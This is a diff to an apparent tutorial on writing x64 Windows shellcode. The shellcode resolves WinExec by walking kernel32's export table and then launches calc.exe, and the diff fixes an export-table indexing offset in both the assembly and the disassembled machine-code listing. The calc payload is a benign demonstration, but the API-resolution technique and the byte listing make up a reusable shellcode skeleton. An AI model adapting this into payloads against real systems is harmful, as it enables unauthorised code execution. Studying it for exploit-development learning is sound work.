@@ -222,7 +222,7 @@ jmp kernel32findfunction
 kernel32findfunction: 
     jecxz FunctionNameNotFound    ; If ecx is zero (function not found), set breakpoint
     xor ebx,ebx                   ; Zero EBX
-    mov ebx, [r11+4+rcx*4]        ; EBX = RVA for first AddressOfName
+    mov ebx, [r11+rcx*4]          ; EBX = RVA for first AddressOfName
     add rbx, r8                   ; RBX = Function name VMA / add kernel32 base address to RVA to get WinApi name
     dec rcx                       ; Decrement our loop by one, this goes from Z to A
    
@@ -259,7 +259,7 @@ OrdinalLookup:
    xor r11, r11
    mov r11d, [rdx+0x1c]          ; AddressOfFunctions = RVA
    add r11, r8                   ; AddressOfFunctions VMA in R11. Kernel32+RVA for function addresses
-   mov eax, [r11+4+r13*4]        ; function RVA.
+   mov eax, [r11+r13*4]          ; function RVA.
    add rax, r8                   ; Found the WinExec Api address!!!
    push rax                      ; Store function addresses by pushing it temporarily
    js executeit
@@ -308,8 +308,6 @@ You should get your shellcode output along with your assembly instructions.  Her
 The machine code is contained in the middle section of the output below: 
 
 ```nasm
-winexec.obj:     file format pe-x86-64
-
 Disassembly of section .text:
 
 0000000000000000 <main>:
@@ -340,53 +338,53 @@ Disassembly of section .text:
   57:   eb 00                   jmp    59 <kernel32findfunction>
 
 0000000000000059 <kernel32findfunction>:
-  59:   67 e3 1a                jecxz  76 <FunctionNameNotFound>
+  59:   67 e3 19                jecxz  75 <FunctionNameNotFound>
   5c:   31 db                   xor    %ebx,%ebx
-  5e:   41 8b 5c 8b 04          mov    0x4(%r11,%rcx,4),%ebx
-  63:   4c 01 c3                add    %r8,%rbx
-  66:   48 ff c9                dec    %rcx
-  69:   4c 8b 08                mov    (%rax),%r9
-  6c:   4c 39 0b                cmp    %r9,(%rbx)
-  6f:   74 02                   je     73 <FunctionNameFound>
-  71:   75 e6                   jne    59 <kernel32findfunction>
+  5e:   41 8b 1c 8b             mov    (%r11,%rcx,4),%ebx
+  62:   4c 01 c3                add    %r8,%rbx
+  65:   48 ff c9                dec    %rcx
+  68:   4c 8b 08                mov    (%rax),%r9
+  6b:   4c 39 0b                cmp    %r9,(%rbx)
+  6e:   74 02                   je     72 <FunctionNameFound>
+  70:   75 e7                   jne    59 <kernel32findfunction>
 
-0000000000000073 <FunctionNameFound>:
-  73:   51                      push   %rcx
-  74:   eb 01                   jmp    77 <OrdinalLookupSetup>
+0000000000000072 <FunctionNameFound>:
+  72:   51                      push   %rcx
+  73:   eb 01                   jmp    76 <OrdinalLookupSetup>
 
-0000000000000076 <FunctionNameNotFound>:
-  76:   cc                      int3
+0000000000000075 <FunctionNameNotFound>:
+  75:   cc                      int3
 
-0000000000000077 <OrdinalLookupSetup>:
-  77:   41 5f                   pop    %r15
-  79:   78 00                   js     7b <OrdinalLookup>
+0000000000000076 <OrdinalLookupSetup>:
+  76:   41 5f                   pop    %r15
+  78:   78 00                   js     7a <OrdinalLookup>
 
-000000000000007b <OrdinalLookup>:
-  7b:   4c 89 f9                mov    %r15,%rcx
-  7e:   4d 31 db                xor    %r11,%r11
-  81:   44 8b 5a 24             mov    0x24(%rdx),%r11d
-  85:   4d 01 c3                add    %r8,%r11
-  88:   48 ff c1                inc    %rcx
-  8b:   66 45 8b 2c 4b          mov    (%r11,%rcx,2),%r13w
-  90:   4d 31 db                xor    %r11,%r11
-  93:   44 8b 5a 1c             mov    0x1c(%rdx),%r11d
-  97:   4d 01 c3                add    %r8,%r11
-  9a:   43 8b 44 ab 04          mov    0x4(%r11,%r13,4),%eax
-  9f:   4c 01 c0                add    %r8,%rax
-  a2:   50                      push   %rax
-  a3:   78 00                   js     a5 <executeit>
+000000000000007a <OrdinalLookup>:
+  7a:   4c 89 f9                mov    %r15,%rcx
+  7d:   4d 31 db                xor    %r11,%r11
+  80:   44 8b 5a 24             mov    0x24(%rdx),%r11d
+  84:   4d 01 c3                add    %r8,%r11
+  87:   48 ff c1                inc    %rcx
+  8a:   66 45 8b 2c 4b          mov    (%r11,%rcx,2),%r13w
+  8f:   4d 31 db                xor    %r11,%r11
+  92:   44 8b 5a 1c             mov    0x1c(%rdx),%r11d
+  96:   4d 01 c3                add    %r8,%r11
+  99:   43 8b 04 ab             mov    (%r11,%r13,4),%eax
+  9d:   4c 01 c0                add    %r8,%rax
+  a0:   50                      push   %rax
+  a1:   78 00                   js     a3 <executeit>
 
-00000000000000a5 <executeit>:
-  a5:   41 5f                   pop    %r15
-  a7:   b8 00 00 00 00          mov    $0x0,%eax
-  ac:   50                      push   %rax
-  ad:   48 b8 63 61 6c 63 2e    movabs $0x6578652e636c6163,%rax
-  b4:   65 78 65
-  b7:   50                      push   %rax
-  b8:   48 89 e1                mov    %rsp,%rcx
-  bb:   ba 01 00 00 00          mov    $0x1,%edx
-  c0:   48 83 ec 30             sub    $0x30,%rsp
-  c4:   41 ff d7                call   *%r15
+00000000000000a3 <executeit>:
+  a3:   41 5f                   pop    %r15
+  a5:   b8 00 00 00 00          mov    $0x0,%eax
+  aa:   50                      push   %rax
+  ab:   48 b8 63 61 6c 63 2e    movabs $0x6578652e636c6163,%rax
+  b2:   65 78 65
+  b5:   50                      push   %rax
+  b6:   48 89 e1                mov    %rsp,%rcx
+  b9:   ba 01 00 00 00          mov    $0x1,%edx
+  be:   48 83 ec 30             sub    $0x30,%rsp
+  c2:   41 ff d7                call   *%r15
 ```
 
 **here's what it looks like with just the machine code extracted:**
